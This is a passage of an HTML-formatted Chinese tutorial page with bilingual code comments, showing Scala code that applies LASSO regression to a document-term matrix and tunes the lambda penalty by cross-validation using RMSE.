&lt;span class=&quot;crayon-v&quot;&gt;testData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;documentTermMatrix&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;addDocumentToRecords&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_3&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0010 seconds] --&gt;
&lt;p&gt;有了这个从文本到数值的转换，现在我们可以利用回归分析工具箱了。我们在“基于身高预测体重”的实例中应用了&lt;a href=&quot;http://en.wikipedia.org/wiki/Ordinary_least_squares&quot;&gt;普通最小二乘法 (OLS&lt;/a&gt;)，不过这次我们要应用&lt;a href=&quot;http://en.wikipedia.org/wiki/Least_squares#Lasso_method&quot;&gt;“最小绝对收缩与选择算子”(Lasso&lt;/a&gt;) 回归。这是因为我们可以给这种回归方法提供某个 λ 值，它代表一个惩罚值。该惩罚值可以帮助 LASSO 算法选择相关的特征（单词）而丢弃其他一些特征（单词）。&lt;/p&gt;
&lt;p&gt;LASSO 执行的这一特征选择功能非常有用，因为在本例中，文档说明包含了大量的单词。LASSO 会设法找出那些单词的一个合适的子集作为特征，而要是应用 OLS，则所有单词都会被使用，那么运行时间将会变得极其漫长。此外，OLS 算法实现会检测非满秩。这是维数灾难的一种情形。&lt;/p&gt;
&lt;p&gt;无论如何，我们需要找出一个最佳的 λ 值，因此，我们应该用交叉验证法尝试几个 λ 值，操作过程如下：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d0613b0392974806&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
    for (i &amp;lt;- 0 until cv.k) {
      //Split off the training datapoints and classifiers from the dataset
      //从数据集中将用于训练的数据点与分类器分离出来
      val dpForTraining = numericDTM
        ._1
        .zipWithIndex
        .filter(x =&amp;gt; cv
                    .test(i)
                    .toList
                    .contains(x._2)
                )
        .map(y =&amp;gt; y._1)

      val classifiersForTraining = numericDTM
        ._2
        .zipWithIndex
        .filter(x =&amp;gt; cv
                    .test(i)
                    .toList
                    .contains(x._2)
                )
        .map(y =&amp;gt; y._1)

      //And the corresponding subset of data points and their classifiers for testing
      //以及对应的用于测试的数据点子集及其分类器
      val dpForTesting = numericDTM
        ._1
        .zipWithIndex
        .filter(x =&amp;gt; !cv
                    .test(i)
                    .contains(x._2)
                )
        .map(y =&amp;gt; y._1)

      val classifiersForTesting = numericDTM
        ._2
        .zipWithIndex
        .filter(x =&amp;gt; !cv
                    .test(i)
                    .contains(x._2)
                )
        .map(y =&amp;gt; y._1)

      //These are the lambda values we will verify against
      //这些是我们将要验证的λ值
      val lambdas: Array[Double] = Array(0.1, 0.25, 0.5, 1.0, 2.0, 5.0)

      lambdas.foreach { x =&amp;gt;
        //Define a new model based on the training data and one of the lambda&#39;s
        //定义一个基于训练数据和其中一个λ值的新模型
        val model = new LASSO(dpForTraining, classifiersForTraining, x)

        //Compute the RMSE for this model with this lambda
        //计算该模型的RMSE值
        val results = dpForTesting.map(y =&amp;gt; model.predict(y)) zip classifiersForTesting
        val RMSE = Math
            .sqrt(results
                    .map(x =&amp;gt; Math.pow(x._1 - x._2, 2)).sum /
                                 results.length
                        )
        println(&quot;Lambda: &quot; + x + &quot; RMSE: &quot; + RMSE)

      }
    }&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-11&quot;&gt;11&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-12&quot;&gt;12&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-13&quot;&gt;13&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-14&quot;&gt;14&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-15&quot;&gt;15&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-16&quot;&gt;16&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-17&quot;&gt;17&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-18&quot;&gt;18&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-19&quot;&gt;19&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-20&quot;&gt;20&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-21&quot;&gt;21&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-22&quot;&gt;22&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-23&quot;&gt;23&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-24&quot;&gt;24&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-25&quot;&gt;25&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-26&quot;&gt;26&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-27&quot;&gt;27&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-28&quot;&gt;28&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-29&quot;&gt;29&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-30&quot;&gt;30&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-31&quot;&gt;31&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-32&quot;&gt;32&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-33&quot;&gt;33&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-34&quot;&gt;34&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-35&quot;&gt;35&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-36&quot;&gt;36&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-37&quot;&gt;37&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-38&quot;&gt;38&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-39&quot;&gt;39&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-40&quot;&gt;40&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-41&quot;&gt;41&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-42&quot;&gt;42&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-43&quot;&gt;43&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-44&quot;&gt;44&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-45&quot;&gt;45&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-46&quot;&gt;46&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-47&quot;&gt;47&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-48&quot;&gt;48&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-49&quot;&gt;49&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-50&quot;&gt;50&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-51&quot;&gt;51&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-52&quot;&gt;52&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-53&quot;&gt;53&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-54&quot;&gt;54&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-55&quot;&gt;55&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-56&quot;&gt;56&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-57&quot;&gt;57&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-58&quot;&gt;58&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-59&quot;&gt;59&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-60&quot;&gt;60&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-61&quot;&gt;61&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-62&quot;&gt;62&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-63&quot;&gt;63&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d0613b0392974806-64&quot;&gt;64&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-1&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;until &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;cv&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-2&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Split off the training datapoints and classifiers from the dataset&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-3&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//从数据集中将用于训练的数据点与分类器分离出来&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;dpForTraining&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;numericDTM&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_1&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;zipWithIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;cv&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-10&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-13&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifiersForTraining&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;numericDTM&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;_2&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-16&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;zipWithIndex&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;cv&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;toList&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;contains&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-23&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d0613b0392974806-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//And the corresponding subset of data points and their classifiers for testing&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d0613b0392974806-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//以及对应的用于测试的数据点子集及其分类器&lt;/span&gt;
&lt;/div&gt;
